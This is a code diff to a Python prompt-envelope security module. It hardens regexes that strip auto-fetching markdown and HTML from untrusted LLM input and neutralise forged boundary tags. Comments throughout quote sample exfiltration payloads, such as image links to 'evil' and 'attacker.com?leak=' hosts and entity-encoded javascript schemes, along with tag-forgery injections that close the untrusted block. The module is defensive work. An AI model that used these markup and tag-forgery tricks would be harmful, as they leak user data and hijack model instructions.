@@ -31,12 +31,27 @@ capability isolation for full coverage.
 from __future__ import annotations
 
 import base64
+import html as _html
+import logging
 import re
 import secrets
 from dataclasses import dataclass
 from typing import Literal
 
 from core.security.log_sanitisation import escape_nonprintable
+
+logger = logging.getLogger(__name__)
+
+# Defensive iteration bound for neutralize_tag_forgery's fixpoint
+# loop. Real inputs settle in <= 3 passes (each pass only inserts
+# characters at positions its own patterns then refuse); the bound
+# exists so a design regression degrades to a LOUD warning instead
+# of an unbounded loop. Do not lower to 1: single-pass is exactly
+# the cross-arm masking hole the loop closes. Do not raise
+# meaningfully: an input needing many passes indicates an editing
+# pass whose replacements re-arm other patterns, which the
+# insert-only design forbids — that wants a fix, not headroom.
+_NEUTRALISE_MAX_PASSES = 10
 
 
 def _escape_for_envelope(s: str) -> str:
@@ -151,6 +166,32 @@ class PromptBundle:
     nonce: str
 
 
+# CommonMark link TEXT may contain BALANCED brackets, and markdown-it
+# accepts them at UNBOUNDED nesting depth (renderer-adjudicated:
+# `![a[b[c[d[e[f[g]]]]]]](url)` still renders an auto-fetching
+# image), while the family's `[^\]]{0,8192}` label grammar stops at
+# the first `]` — `![a[b]](https://evil/x.png)` was a zero-click
+# fetch through every arm. Two layers close the class:
+#
+# * `_NESTED_LABEL` widens the label grammar to TWO nesting levels
+#   (whole-construct removal for every realistic label; the
+#   alternation branches are first-char disjoint so matching stays
+#   linear). Reference-definition/usage LABELS keep the flat grammar
+#   deliberately — CommonMark reference labels may not contain
+#   unescaped brackets.
+# * Because no finite regex depth can match the renderer's unbounded
+#   acceptance, closer-anchored belt arms (`](scheme:…)` /
+#   `](//…)`, plus the decode-then-match chokepoint below, which is
+#   also closer-anchored) strip the DESTINATION tail at ANY depth —
+#   destroying the construct even when the label out-nests the
+#   grammar. Residual, named: nested-label images with RELATIVE
+#   destinations beyond depth 2 are not stripped — a relative
+#   destination fetches from the rendering origin and carries no
+#   attacker exfil target.
+_NESTED_LABEL = (
+    r'(?:[^\][]|\[(?:[^\][]|\[[^\][]{0,4096}\]){0,4096}\]){0,8192}'
+)
+
 # Markup that auto-fetches external resources from inside an LLM response —
 # defended against because an attacker can use it for exfiltration:
 # `![](attacker.com?leak=...)` doesn't need to hijack output, just slip into
@@ -164,18 +205,36 @@ _AUTOFETCH_MARKUP_RE = re.compile(
     # HTML tags fit well under 1 KB; 8 KB leaves headroom for a
     # legitimately long URL plus attribute clutter while bounding
     # adversarial input. Each arm gets its own `{0,8192}` cap.
-    r'!\[[^\]]{0,8192}\]\([^)]{1,8192}\)'
+    r'!\[' + _NESTED_LABEL + r'\]\([^)]{1,8192}\)'
     # Markdown link with auto-fetching scheme. `vbscript:` is the IE-era
     # equivalent of `javascript:` and still parses in some renderers.
     # `//host/path` (scheme-relative) inherits the page scheme — at-risk
     # in any context where the rendered output flows back to a browser.
-    r'|\[[^\]]{0,8192}\]\((?:https?|ht%74ps?|data|javascript|vbscript|file|ftp)?:[^)]{1,8192}\)'
-    r'|\[[^\]]{0,8192}\]\(//[^)]{1,8192}\)'
+    r'|\[' + _NESTED_LABEL + r'\]\((?:https?|ht%74ps?|data|javascript|vbscript|file|ftp)?:[^)]{1,8192}\)'
+    # Encoded-spelling scheme belt (kin of the ht%74ps arm above,
+    # which is one spelling deep): any destination whose scheme-
+    # position head carries a percent-escape or an HTML entity before
+    # the first `:` is an encoded scheme respelling — `%68ttps:`,
+    # `j&#97;vascript:`, `&#104;ttps:` — that renderers decode before
+    # dispatch. Plain relative paths (no colon) and ordinary URLs
+    # (colon before any %/&) never match; the head is bounded so the
+    # arm stays linear.
+    r'|\[' + _NESTED_LABEL + r'\]\([^):\s]{0,128}[%&][^):\s]{0,128}:[^)]{1,8192}\)'
+    r'|\[' + _NESTED_LABEL + r'\]\(//[^)]{1,8192}\)'
+    # Closer-anchored belts: strip the destination TAIL of any
+    # link/image whose label out-nests the grammar above — the
+    # rendered construct requires the literal `](dest)` closer, so
+    # destroying it kills the fetch at ANY nesting depth. Benign
+    # code shapes (`arr[i](x)`) carry no scheme and never match.
+    r'|\]\(\s{0,8}(?:https?|ht%74ps?|data|javascript|vbscript|file|ftp):[^)]{1,8192}\)'
+    r'|\]\(\s{0,8}//[^)]{1,8192}\)'
+    r'|\]\(\s{0,8}(?:https?|ht%74ps?|data|javascript|vbscript|file|ftp):(?=[^)]{8192})'
+    r'|\]\(\s{0,8}//(?=[^)]{8192})'
     # Inline link/image with an angle-bracket destination —
     # `[click](<javascript:...>)` / `![x](<//evil>)`. The `\(scheme:`
     # arms above never see the `<`, and angle destinations may contain
     # spaces, so strip the form regardless of the scheme spelling.
-    r'|!?\[[^\]]{0,8192}\]\(\s{0,8}<[^>\n]{0,8192}>'
+    r'|!?\[' + _NESTED_LABEL + r'\]\(\s{0,8}<[^>\n]{0,8192}>'
     # `<image>` is the HTML parser's alias for `<img>` (auto-fetches);
     # `<input type=image>` fetches its src; `<frame>`/`<track>` fetch;
     # `<bgsound>`/`<applet>`/`<portal>` are legacy/experimental
@@ -192,15 +251,37 @@ _AUTOFETCH_MARKUP_RE = re.compile(
     # tag (only the `<style>` element and `@import url()` were
     # covered). Redacting through `url(` breaks the fetch; the tail
     # stays behind as inert text.
-    r'|style\s*=\s*[^>]{0,8192}?url\s*\('
-    # `<style>` with body OR a self-contained tag. The original pattern
-    # required `</style>`, so a malformed `<style>...` (no close tag) or
-    # a self-closing variant slipped through. `\b[^>]*>` matches either,
-    # the body+close path is kept as a separate alternative for the
-    # @import-inside-style case.
-    r'|<style\b[^>]*>.*?</style>'
-    r'|<style\b[^>]*>'
-    r'|@import\s+url\([^)]*\)'
+    # `image-set('//e' 1x)` (and its -webkit- spelling, matched
+    # unanchored) fetches exactly like `url(` — the arm must not
+    # require the one function name.
+    r'|style\s*=\s*[^>]{0,8192}?(?:url|image-set)\s*\('
+    # CSS fetch functions with an ABSOLUTE or scheme-relative target,
+    # wherever they appear — the <style> element arm below strips the
+    # open tag only (the old body+close alternative was quadratic),
+    # so a fetch inside what was the style body must be caught by the
+    # function call itself. The URL body is consumed so the target
+    # host never survives into the rendered text; relative url(x.png)
+    # references carry no exfil target and stay untouched.
+    r'|\b(?:url|image-set)\s{0,8}\(\s{0,8}[\'"]?\s{0,8}'
+    r'(?:https?:|ht%74ps?:|//)[^)\'"\s]{0,8192}'
+    # `<style>` open tag, bounded like every other tag arm. The old
+    # body+close alternative (`<style\b[^>]*>.*?</style>` under
+    # DOTALL) was quadratic on repeated unclosed opens: at each
+    # `<style…>` the lazy `.*?</style>` scanned to end-of-input before
+    # the bare-open arm matched — O(k·n), ~2s at 8K repeats and
+    # unbounded on a multi-MB hostile file transiting this always-on
+    # envelope path. Dropping it loses nothing: the bare-open arm
+    # already defangs the tag (an unopened `</style>` is inert), and
+    # the `@import url(` arm below catches fetches inside what was the
+    # body. The open arm's attribute run is bounded at 8 KB with the
+    # over-long fallback joining the family arm further down.
+    r'|<style\b[^>]{0,8192}>'
+    # The @import url body is bounded like the other fetch arms:
+    # unbounded, every planted '@import url(' re-scans the rest of
+    # a hostile document — quadratic. Real imports sit far below
+    # 2048 chars; an over-long target simply keeps the arm from
+    # matching that one decoy span.
+    r'|@import\s+url\([^)]{0,2048}\)'
     # Reference-style link/image DEFINITION — `[label]: destination`.
     # The explicit-scheme arm above this comment block predates these
     # and stays (unanchored defence-in-depth); it missed scheme-
@@ -251,17 +332,83 @@ _AUTOFETCH_MARKUP_RE = re.compile(
     # lookaheads make these arms fire only when the bounded arms
     # cannot (≥8192 chars with no delimiter), and keep scanning
     # bounded.
-    r'|!\[[^\]]{0,8192}\]\((?=[^)]{8192})'
-    r'|\[[^\]]{0,8192}\]\((?:https?|ht%74ps?|data|javascript|vbscript|file|ftp)?:(?=[^)]{8192})'
-    r'|\[[^\]]{0,8192}\]\(//(?=[^)]{8192})'
+    r'|!\[' + _NESTED_LABEL + r'\]\((?=[^)]{8192})'
+    r'|\[' + _NESTED_LABEL + r'\]\((?:https?|ht%74ps?|data|javascript|vbscript|file|ftp)?:(?=[^)]{8192})'
+    r'|\[' + _NESTED_LABEL + r'\]\(//(?=[^)]{8192})'
     r'|<(?:img|image|iframe|object|embed|video|audio|source|track'
     r'|input|frame|link|script|base|form|use|bgsound|applet|portal'
-    r'|svg|meta)\b(?=[^>]{8192})'
+    r'|svg|meta|style)\b(?=[^>]{8192})'
     r'|<a[\s/](?=[^>]{8192})',
     re.IGNORECASE | re.DOTALL,
 )
 
+# Registry of bracket-style block-boundary tag NAMES the in-tree
+# assemblers mint. ONE home, derived both ways: the neutraliser's
+# bracket arm below is BUILT from this tuple, and minting sites
+# reference the named constants — so a new block type joins the
+# forgery vocabulary by construction. The closure test
+# (test_prompt_envelope: bracket-boundary registry closure) scans the
+# runtime tree for pair-minted bracket tags and fails on any name
+# missing here; `[threat-model-context]` was hand-omitted from the
+# vocabulary exactly this way (the threat-model block's own boundary
+# was forgeable on the lanes that DID run the neutraliser).
+MARK_INPT_TAG = "MARK_INPT"
+THREAT_MODEL_CONTEXT_TAG = "threat-model-context"
+BLOCK_BOUNDARY_TAG_NAMES: tuple[str, ...] = (
+    MARK_INPT_TAG,
+    THREAT_MODEL_CONTEXT_TAG,
+)
+
+# One arm per registered name: opener (with optional attributes, e.g.
+# `[threat-model-context source=operator]`) and closer, whitespace-
+# tolerant like the XML arms. Attribute run bounded at 256.
+#
+# The closing `]` is OPTIONAL — matching the XML arms' prefix
+# philosophy (`<untrusted` matches with no `>` required). A
+# closer-required arm left tag HALVES invisible: `[name attrs…`
+# without its `]` matched nothing, so two separately-neutralised
+# fragments could reassemble into a live tag when a rendering site
+# joined them (`fragment-with-opener` + `separator` + `]…`).
+#
+# Whitespace is legal between `[` and `/` for the same
+# parser-tolerance reason the XML arms accept `< /untrusted`; the
+# slash gates its own trailing whitespace ((?:/\s*)?) because the
+# `\s*/?\s*` chain shape is quadratic on a bracket-opening run.
+#
+# What this arm guarantees — exactly, no more: any occurrence of
+# `[` + optional whitespace/slash + a REGISTERED name inside one
+# examined text is matched, and the replacement defangs EVERY `[`
+# in the span, so no live bracket-tag shape survives within text
+# the neutraliser saw whole. It guarantees NOTHING across texts it
+# saw separately: a joining site can itself supply the characters a
+# live shape needs (a bare-whitespace join supplies the gap of a
+# `[ name` opener; a `[{fragment}]` template supplies both brackets
+# around a bare vocabulary-name fragment). Rendering sites own that
+# seam — they defend the JOINED text (join-then-defend) or the
+# COMPOSED bracketed template, never fragments alone.
+#
+# Trade in the benign direction: prose containing an unclosed
+# `[<name>…` run — text already spelling the reserved boundary
+# vocabulary — gets the same invisible ZWSP defang a complete tag
+# gets; bracketed prose not spelling a registered name is untouched
+# (pinned by test_benign_brackets_untouched).
+_BRACKET_BOUNDARY_ARMS = "".join(
+    r"|\[\s*(?:/\s*)?" + re.escape(name) + r"\b[^\]]{0,256}\]?"
+    for name in BLOCK_BOUNDARY_TAG_NAMES
+)
+
+# The optional slash gates its own trailing whitespace in the three
+# tag arms ((?:/\s*)?) — the ``\s*/?\s*`` chains were quadratic on
+# a '<'-opening run in untrusted content.
 _ENVELOPE_TAG_RE = re.compile(
+    # Spelling note: this pattern neutralises ASCII spellings only. A
+    # fullwidth/homoglyph respelling of a closing tag (`＜/untrusted＞`)
+    # is not defanged HERE — that class is owned by the character
+    # layer (`_BYPASS_CHAR_RE` strips the format/bidi machinery, and
+    # any future confusable fold belongs there, one home for all tag
+    # arms), and current model-side parsers do not treat fullwidth
+    # brackets as tag delimiters. Recorded so a confusable-folding
+    # change lands in the character layer, not per-arm.
     # XML-style tags used by the structured-XML envelope.  No suffix
     # requirement after `untrusted`: callers emit bare `<untrusted
     # kind=...>` / `</untrusted>` (core/audit/context.py,
@@ -270,16 +417,20 @@ _ENVELOPE_TAG_RE = re.compile(
     # `<untrusted_tool_output>`, ...).  A previous `untrusted[-_]`
     # pattern required a suffix, so the exact bare closing tag those
     # callers wrap evidence in passed through unneutralised.
-    r'</?\s*untrusted'
-    r'|</?\s*slots?\b'
-    r'|</?\s*document(?:_content)?\b'
-    # Bracket-style markers used by the PASSTHROUGH / [MARK_INPT]
-    # envelope (prompt_envelope._render_passthrough). Without these,
-    # untrusted content containing the literal `[MARK_INPT]` or
-    # `[/MARK_INPT]` could visually close the envelope and inject
-    # text the model treats as outside-the-mark — same prompt-
-    # injection class the XML cases above neutralise.
-    r'|\[/?\s*MARK_INPT\s*\]'
+    # `<\s*/?` (not `</?`): whitespace is legal between `<` and `/` in
+    # HTML/XML-ish parsers, so `< /untrusted-XXXX>` reads as a closing
+    # tag downstream while a `</?` pattern passes it through raw.
+    r'<\s*(?:/\s*)?untrusted'
+    r'|<\s*(?:/\s*)?slots?\b'
+    r'|<\s*(?:/\s*)?document(?:_content)?\b'
+    # Bracket-style block boundaries — DERIVED from
+    # BLOCK_BOUNDARY_TAG_NAMES above ([MARK_INPT] from the
+    # PASSTHROUGH envelope, [threat-model-context source=…] from the
+    # threat-model prompt block). Untrusted content carrying a
+    # literal closer could visually close the block and inject text
+    # the model treats as outside the labeled-untrusted region —
+    # same prompt-injection class the XML cases above neutralise.
+    + _BRACKET_BOUNDARY_ARMS +
     # Line-marker style used by the BEGIN_/END_ envelope variant.
     # The marker name is `[A-Z_]+`; an attacker including
     # `BEGIN_INPT` or `END_X` in untrusted content could similarly
@@ -363,6 +514,36 @@ def wrap_untrusted(content: str, *, kind: str, origin: str) -> str:
     )
 
 
+# Full-string frame produced by ``wrap_untrusted``: nonce-tagged open
+# line, content, nonce-matched close. Greedy inner group + end anchor
+# means a content-embedded (neutralised) closer can never truncate the
+# unwrap — only the real final close tag matches.
+_ENVELOPE_FRAME_RE = re.compile(
+    r'\A<untrusted-([0-9a-f]{' + str(_NONCE_BYTES * 2) + r'}) '
+    r'kind="[^"]*" origin="[^"]*">\n'
+    r'(.*)'
+    r'\n</untrusted-\1>\Z',
+    re.DOTALL,
+)
+
+
+def unwrap_untrusted(text: str) -> str:
+    """Strip the ``wrap_untrusted`` / ``wrap_tool_result`` frame from
+    *text*; return *text* unchanged when it is not a single
+    well-formed envelope.
+
+    Returns the envelope's inner content as persisted — i.e. AFTER the
+    wrap-time floor defences (autofetch strip, non-printable escape,
+    tag-forgery neutralisation), not a byte-exact inverse of the
+    original. That is the honest fidelity for the intended consumer:
+    resume-time x-source value extraction needs the same content shape
+    in-run extraction saw (typical JSON round-trips untouched), never
+    the envelope frame itself.
+    """
+    m = _ENVELOPE_FRAME_RE.match(text)
+    return m.group(2) if m else text
+
+
 _HEX_DIGITS = frozenset('0123456789abcdefABCDEF')
 
 
@@ -416,6 +597,56 @@ _BYPASS_CHAR_RE = re.compile(
 )
 
 
+# Decode-then-match for markdown LINK destinations. Renderers apply
+# two decode axes to a parsed destination before building the href —
+# HTML entities (named and numeric, up to 8 dec/hex digits in
+# markdown-it) and CommonMark backslash-escapes — so any encoded
+# spelling of a scheme, a colon, or the `//` scheme-relative head
+# (`https&colon;//e`, `https&#0000058;//e`, `https\://e`,
+# `&#47;&#47;e`, `\/\/e`, `j&#97;vascript&#x3a;…`) renders live
+# while matching NONE of the raw-text arms. Enumerated spellings
+# lose this race by construction; instead the destination is decoded
+# ONCE with the renderer's own two axes and the SAME scheme /
+# scheme-relative vocabulary the raw arms model is re-checked on the
+# decoded form — the normalisation-chokepoint discipline the
+# env-name fold uses. Only destinations the decode actually CHANGED
+# are judged (raw spellings stay owned by the raw arms), so benign
+# entities in prose and undecoded destinations render exactly as
+# before.
+# Closer-anchored (`](dest)`) rather than label-anchored: CommonMark
+# labels nest to unbounded depth, so anchoring on the label would
+# reopen the class the belts above close; the decode decision only
+# needs the destination.
+_MD_LINK_DEST_RE = re.compile(r'\]\(\s{0,8}([^)]{1,8192})\)')
+# CommonMark: a backslash before ASCII punctuation escapes it (the
+# backslash is dropped); before anything else it stays literal.
+_BACKSLASH_ESCAPE_RE = re.compile(r'\\([!-/:-@\[-`{-~])')
+# Decoded-form vocabulary — the raw scheme arms' alternation plus the
+# scheme-relative head, anchored at the decoded destination start.
+_DECODED_SCHEME_RE = re.compile(
+    r'(?:https?|data|javascript|vbscript|file|ftp):|//',
+    re.IGNORECASE,
+)
+
+
+def _decode_link_destination(dest: str) -> str:
+    """Apply the renderer's two decode axes: CommonMark
+    backslash-escapes, then HTML entities (``html.unescape`` is at
+    least as lenient as any renderer's entity parser — the safe
+    direction: leniency here can only widen what gets stripped)."""
+    return _html.unescape(_BACKSLASH_ESCAPE_RE.sub(r'\1', dest))
+
+
+def _strip_encoded_scheme_links(text: str) -> str:
+    def _sub(m: re.Match) -> str:
+        dest = m.group(1)
+        decoded = _decode_link_destination(dest)
+        if decoded != dest and _DECODED_SCHEME_RE.match(decoded):
+            return '[REDACTED-AUTOFETCH-MARKUP]'
+        return m.group(0)
+    return _MD_LINK_DEST_RE.sub(_sub, text)
+
+
 def _strip_autofetch_markup(content: str) -> str:
     # Strip parser-invisible characters first. Pre-fix this only
     # stripped \x00; the zero-width and bidi-control characters above
@@ -426,6 +657,7 @@ def _strip_autofetch_markup(content: str) -> str:
     # `<im​g src=evil>` renders as a real `<img>` tag while our
     # regex doesn't match it as `img`.
     cleaned = _BYPASS_CHAR_RE.sub('', content)
+    cleaned = _strip_encoded_scheme_links(cleaned)
     return _AUTOFETCH_MARKUP_RE.sub('[REDACTED-AUTOFETCH-MARKUP]', cleaned)
 
 
@@ -454,6 +686,8 @@ _MARKDOWN_HEADING_RE = re.compile(r'(?m)^( {0,3})(#+)')
 # preserves them byte-for-byte.
 _SETEXT_UNDERLINE_RE = re.compile(
     r'(?m)(?<=\S)([ \t]*\n {0,3})(=+|-+)([ \t]*)$'
+    # line-model: _escape_for_envelope runs first on the wrap path,
+    # so a raw \r is already the visible text \x0d before this scan
 )
 
 
@@ -525,26 +759,68 @@ def neutralize_tag_forgery(content: str) -> str:
         # the result (e.g. _render_slot's _xml_content_escape pass).
         if s.startswith('<'):
             return '<\u200b' + s[1:]
-        # Bracket-style: insert ZWSP after `[` and before `]` so the
-        # model no longer pattern-matches against envelope boundaries.
-        # Same rationale as the XML-style fix above — entity escaping
-        # (&#91;/&#93;) caused double-encoding downstream.
+        # Bracket-style: insert ZWSP after EVERY `[` (and before a
+        # closing `]`) so the model no longer pattern-matches against
+        # envelope boundaries. Entity escaping (&#91;/&#93;) caused
+        # double-encoding downstream, hence ZWSP. Every `[`, not just
+        # the first: the attribute run ([^\]]{0,256}) tolerates a
+        # nested `[<name>` and re.sub never rescans its replacement,
+        # so a first-bracket-only insert left the inner tag live
+        # (`[MARK_INPT[MARK_INPT]`). Same single-pass-complete
+        # discipline as the BEGIN_/END_ branch below (ZWSP after
+        # EVERY underscore): with ZWSP after every `[`, no
+        # bracket-arm shape survives anywhere in the replacement. A
+        # complete tag with no nested `[` produces byte-identical
+        # output to the previous first-bracket-only insert.
         if s.startswith('['):
-            inner = s[1:-1] if s.endswith(']') else s[1:]
+            body = s[:-1] if s.endswith(']') else s
             tail = '\u200b]' if s.endswith(']') else ''
-            return '[\u200b' + inner + tail
+            return body.replace('[', '[\u200b') + tail
         # Line-marker style (BEGIN_X / END_X): break the keyword by
-        # inserting a zero-width space after the `_` so the visual
-        # match against `BEGIN_<MARKER>` no longer fires. ZWSP is
-        # invisible to humans and to the model's structural parsing.
+        # inserting a zero-width space after EVERY underscore so the
+        # visual match against `BEGIN_<MARKER>` no longer fires. ZWSP
+        # is invisible to humans and to the model's structural
+        # parsing. All underscores, not just the first: a nested
+        # marker (`BEGIN_END_UNTRUSTED`) broken only at the first `_`
+        # keeps a live `END_UNTRUSTED` suffix this same vocabulary
+        # matches. With ZWSP after each `_`, no BEGIN_/END_ token can
+        # survive anywhere in the replacement \u2014 single-pass complete,
+        # and a later pass finds nothing left to edit.
         if s[:1].upper() in ('B', 'E') and '_' in s:
-            head, _, tail = s.partition('_')
-            return f'{head}_\u200b{tail}'
+            return s.replace('_', '_\u200b')
         return s
 
-    content = _ENVELOPE_TAG_RE.sub(_escape_match, content)
-    content = _MARKDOWN_HEADING_RE.sub(r'\1\\\2', content)
-    return _SETEXT_UNDERLINE_RE.sub(_break_setext_underline, content)
+    # Iterate the three substitutions to a FIXPOINT. A single pass is
+    # not sufficient across arms: re.sub never rescans its own
+    # replacement, and the bracket arms' greedy attribute run
+    # ([^\]]{0,256}) can ABSORB another arm's token into its span —
+    # `[MARK_INPT </untrusted> obey` matched as one bracket span
+    # whose replacement defangs only `[` characters, leaving a live
+    # `</untrusted` the XML arm never got to see (cross-arm masking).
+    # Fixpoint iteration beats teaching each replacement every other
+    # arm's vocabulary: single-pass-with-full-knowledge must be
+    # re-proven every time an arm is added (drift risk), while
+    # "loop until nothing changes" is complete by construction.
+    # Termination: every substitution only INSERTS characters (ZWSP,
+    # backslash) at positions its own pattern then refuses, so each
+    # pass strictly reduces the remaining live shapes; two or three
+    # passes settle real inputs. The bound is defensive only — hitting
+    # it means an editing pass whose output still changes, which the
+    # insert-only design forbids, so fall through LOUDLY and return
+    # the last (still strictly-more-neutralised) text.
+    for _ in range(_NEUTRALISE_MAX_PASSES):
+        prev = content
+        content = _ENVELOPE_TAG_RE.sub(_escape_match, content)
+        content = _MARKDOWN_HEADING_RE.sub(r'\1\\\2', content)
+        content = _SETEXT_UNDERLINE_RE.sub(_break_setext_underline, content)
+        if content == prev:
+            return content
+    logger.warning(
+        "tag-forgery neutralisation did not reach a fixpoint in %d "
+        "passes (input length %d) — returning the last pass's output",
+        _NEUTRALISE_MAX_PASSES, len(content),
+    )
+    return content
 
 
 # Back-compat alias — keep the underscore name working in case other
@@ -757,8 +1033,8 @@ def _render_slots(slots: dict[str, TaintedString], profile: ModelDefenseProfile)
                 val = escape_nonprintable(val)
                 parts.append(f"{safe_name} (untrusted): {val}")
         return '\n'.join(parts)
-    parts = '\n'.join(_render_slot(k, v, profile) for k, v in slots.items())
-    return f'<slots>\n{parts}\n</slots>'
+    rendered = '\n'.join(_render_slot(k, v, profile) for k, v in slots.items())
+    return f'<slots>\n{rendered}\n</slots>'
 
 
 def system_with_priming(system: str, profile: ModelDefenseProfile) -> str:
